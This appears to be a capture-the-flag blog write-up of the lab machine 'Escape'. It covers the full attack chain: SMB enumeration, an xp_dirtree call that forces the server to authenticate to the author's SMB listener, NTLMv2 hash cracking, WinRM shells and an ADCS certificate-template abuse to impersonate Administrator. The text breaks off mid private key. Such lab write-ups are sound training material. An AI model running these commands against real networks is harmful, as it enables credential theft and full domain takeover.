@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/escape.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/escape.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/escape.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="escape">Escape</h1>
+
+<h1 id="skills">Skills</h1>
+
+<ul>
+  <li>Steal MSSQL NTMLv2</li>
+  <li>Enumerate AD Certificate Service</li>
+  <li>Leverage Certificate Template vulnerability</li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>The first port scan show that we are probably againts a Active directory environment.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Wed Sep 27 14:03:45 2023 as: nmap -p- -n -Pn -oN 10.10.10.125_all_ports -vvv --open 10.10.11.202</span>
+Nmap scan report <span class="k">for </span>10.10.11.202
+Host is up, received user-set <span class="o">(</span>0.052s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-09-27 14:03:45 CEST <span class="k">for </span>185s
+Not shown: 65515 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+1433/tcp  open  ms-sql-s         syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49667/tcp open  unknown          syn-ack
+49688/tcp open  unknown          syn-ack
+49689/tcp open  unknown          syn-ack
+49707/tcp open  unknown          syn-ack
+49711/tcp open  unknown          syn-ack
+56316/tcp open  unknown          syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+<span class="c"># Nmap done at Wed Sep 27 14:06:50 2023 -- 1 IP address (1 host up) scanned in 185.51 seconds</span>
+</code></pre></div></div>
+
+<p>Further enumeration show that there certificates envolved, reasons to think that this is a active directory machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Wed Sep 27 12:32:52 2023 as: nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49688,49689,49707,49711 -n -Pn -sCV -vvv -oN 10.10.11.202_enum 10.10.11.202</span>
+Nmap scan report <span class="k">for </span>10.10.11.202
+Host is up, received user-set <span class="o">(</span>0.051s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-09-27 12:32:52 CEST <span class="k">for </span>98s
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-09-27 18:32:59Z<span class="o">)</span>
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>sequel-DC-CA/domainComponent<span class="o">=</span>sequel
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-18T21:20:35
+| Not valid after:  2023-11-18T21:20:35
+| MD5:   869f:7f54:b2ed:ff74:708d:1a6d:df34:b9bd
+| SHA-1: 742a:b452:2191:3317:6739:5039:db9b:3b2e:27b6:f7fa
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
+| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
+| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
+| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
+| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
+| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
+| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
+| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
+| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
+| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
+&lt;<span class="nt">--SNIP--</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Now we will enumerate each service.</p>
+
+<h2 id="smb">SMB</h2>
+
+<p>SMB allowed for an anonymous login which report a share which can be accesed with a PDF from which we can extract a username and password for MSSQL service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PublicUser:GuestUserCantWrite1
+</code></pre></div></div>
+
+<h2 id="mssql">MSSQL</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape]
+└─<span class="nv">$ </span>/usr/bin/impacket-mssqlclient SEQUEL.HTB/PublicUser:GuestUserCantWrite1@10.10.11.202              
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL <span class="o">(</span>PublicUser  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<p>The enumeration of this MSSQL server showed:</p>
+
+<ul>
+  <li>There are no non default table</li>
+  <li>We are a guest account with no admin privileges</li>
+  <li>We can’t execute commands</li>
+  <li>We can enumerate users</li>
+</ul>
+
+<p>With all this we can try to steal a NTLMv2 hash from the service or user that is executing this server. Here we can see three functions to get that hash. Only the last one send a request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>PublicUser  guest@master<span class="o">)&gt;</span> EXEC master..xp_fileexist <span class="s1">'\\10.10.14.17\share\effdsf'</span>
+File Exists   File is a Directory   Parent Directory Exists   
+<span class="nt">-----------</span>   <span class="nt">-------------------</span>   <span class="nt">-----------------------</span>   
+          0                     0                         0   
+
+SQL <span class="o">(</span>PublicUser  guest@master<span class="o">)&gt;</span> EXEC master..xp_subdirs <span class="s1">'\\10.10.14.17\share\effdsf'</span>
+<span class="o">[</span>-] ERROR<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: The EXECUTE permission was denied on the object <span class="s1">'xp_subdirs'</span>, database <span class="s1">'mssqlsystemresource'</span>, schema <span class="s1">'sys'</span><span class="nb">.</span>
+SQL <span class="o">(</span>PublicUser  guest@master<span class="o">)&gt;</span> EXEC master..xp_dirtree <span class="s1">'\\10.10.14.17\share\effdsf'</span>
+subdirectory   depth   
+<span class="nt">------------</span>   <span class="nt">-----</span>
+</code></pre></div></div>
+
+<p>In order to steal the hash we have to set a SMB server before sending the request. We also obtain a user <strong>SQL_SVC</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape/PE/last_try]
+└─<span class="nv">$ </span>/usr/bin/impacket-smbserver share <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span> 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.202,64814<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>sequel<span class="se">\s</span>ql_svc,DC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC<span class="se">\s</span>ql_svc authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sql_svc::sequel:aaaaaaaaaaaaaaaa:f823a38d3b125e8c6e369ad7963a3725:01010000000000000043a3f3acf2d9016c1368f0e74b732a000000000100100046006b005300790055006c0054004b000300100046006b005300790055006c0054004b000200100074006900590073006800750065004f000400100074006900590073006800750065004f00070008000043a3f3acf2d9010600040002000000080030003000000000000000000000000030000076ac7b5afd39b84278989597f31c2fc8077d777e566b516c85cf7b2c8e94a7e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.202,64814<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can crack this hash using Hascat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL_SVC::sequel:aaaaaaaaaaaaaaaa:7963e271d012b4d184fb587c3f424635:
+01010000000000008043164032f1d901a64f07f2408c3045000000000100100063005200450047006f0059005a0062000300100063005200450047006f0059005a0062000200100054006a006d006d004e006500410072000400100054006a006d006d004e00650041007200070008008043164032f1d9010600040002000000080030003000000000000000000000000030000055fae4efb70bb59e9414396130f066853f77c168d7cf3d0b5ee2a1a76c7ff1990a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000:REGGIE1234ronnie
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 <span class="o">(</span>NetNTLMv2<span class="o">)</span>
+Hash.Target......: SQL_SVC::sequel:aaaaaaaaaaaaaaaa:7963e271d012b4d184...000000
+Time.Started.....: Fri Sep 29 10:34:23 2023 <span class="o">(</span>13 secs<span class="o">)</span>
+Time.Estimated...: Fri Sep 29 10:34:36 2023 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:   790.5 kH/s <span class="o">(</span>1.34ms<span class="o">)</span> @ Accel:512 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 10702848/14344386 <span class="o">(</span>74.61%<span class="o">)</span>
+Rejected.........: 0/10702848 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 10698752/14344386 <span class="o">(</span>74.58%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: REPINT1 -&gt; RBRB1616
+Hardware.Mon.#1..: Util: 36%
+
+Started: Fri Sep 29 10:34:22 2023
+Stopped: Fri Sep 29 10:34:38 2023
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>With this hash we can try to gain remote access to the machine or enumerate the whole domain.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape/content]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.11.202  <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span> 
+SMB         10.10.11.202    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.202    445    DC               <span class="o">[</span>+] sequel.htb<span class="se">\s</span>ql_svc:REGGIE1234ronnie 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape/content]
+└─<span class="nv">$ </span>crackmapexec winrm 10.10.11.202  <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span> 
+SMB         10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+HTTP        10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               <span class="o">[</span>+] sequel.htb<span class="se">\s</span>ql_svc:REGGIE1234ronnie <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can see a pwned in WINRM which means that we can connect remotely.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\s</span>ql_svc
+</code></pre></div></div>
+
+<p>We can perform son basic enumeration:</p>
+
+<ul>
+  <li>whoami /all</li>
+  <li>cmdkey /list</li>
+  <li>netstat -ano</li>
+</ul>
+
+<p>But we won’t get to much. Howver if we revise the root of the filesystem we will see a SQLServer folder with error logs inside.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\S</span>QLServer
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+<span class="nt">-a----</span>       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+<span class="nt">-a----</span>       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer&gt; <span class="nb">cd </span>Logs
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+</code></pre></div></div>
+
+<p>From here we can extract the password for the user Ryan.Cooper in cleartext</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2022-11-18 13:43:07.44 Logon       Logon failed <span class="k">for </span>user <span class="s1">'sequel.htb\Ryan.Cooper'</span><span class="nb">.</span> Reason: Password did not match that <span class="k">for </span>the login provided. <span class="o">[</span>CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed <span class="k">for </span>user <span class="s1">'NuclearMosquito3'</span><span class="nb">.</span> Reason: Password did not match that <span class="k">for </span>the login provided. <span class="o">[</span>CLIENT: 127.0.0.1]
+</code></pre></div></div>
+
+<p>Which can be used to connect via WINRM.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/escape]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> <span class="s1">'Ryan.Cooper'</span> <span class="nt">-p</span> <span class="s1">'NuclearMosquito3'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\r</span>yan.cooper
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Now we enumearte again all our common ways to elevate privilages. However, if we remeber we could see a certificate service from this domain, so is worth checking vulnerabilities related to AD Certificate Service. We can use Certify.exe for this. The compiled version can be obtained from https://github.com/Flangvik/SharpCollection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\c</span>ertify.exe find /vulnerable
+</code></pre></div></div>
+
+<p>Upon the execution of that command we can see that there is a vulnerable certificate template. This wouldn’t have reported nothing if we are logged in as SQL_SVC user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Find certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=sequel,DC=htb'</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'sequel-DC-CA'</span>
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+<span class="o">[!]</span> Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\D</span>omain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel<span class="se">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel<span class="se">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel<span class="se">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</code></pre></div></div>
+
+<h2 id="certificate-template-attack">Certificate Template Attack</h2>
+
+<p>We start by requesting a certificate from a user. The vulnerability is in the fact that the template allow anyone (sequel\Domain Users S-1-5-21-4078382237-1492182817-2568127209-513) to request a certificate in behalf on any other user (ENROLLEE_SUPPLIES_SUBJECT).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\c</span>ertify.exe request /ca:dc.sequel.htb<span class="se">\s</span>equel-DC-CA /template:UserAuthentication /altname:Administrator
+</code></pre></div></div>
+
+<p>We obtain a certificate if everything goes well.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Request a Certificates
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Current user context    : sequel<span class="se">\R</span>yan.Cooper
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No subject name specified, using current context as subject.
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Template                : UserAuthentication
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Subject                 : <span class="nv">CN</span><span class="o">=</span>Ryan.Cooper, <span class="nv">CN</span><span class="o">=</span>Users, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AltName                 : Administrator
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate Authority   : dc.sequel.htb<span class="se">\s</span>equel-DC-CA
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> CA Response             : The certificate had been issued.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID              : 11
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> cert.pem         :
+
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAmFymUhXWa0RRZnuaVoW5A6qagKSucz60klfAWIxFmVcW9Ik4
+I7jfHbFJsrwNoXSXk0QRdskhA5WnPlEDuwYqNwvXWXOgn5gvYFs7mR8WEq6Rk/va
+stkRp9qmmM3bkeklll5O1/6KT4JB0tKvad9TrcyrPKok/zbh11+/nnzn6cj+Upla
+2KOCRjVb/Y5tOBSq8oV38qcMNJ3IwFnwk75+gdSE2mKwIrEetNAOO80dhNxJ83md
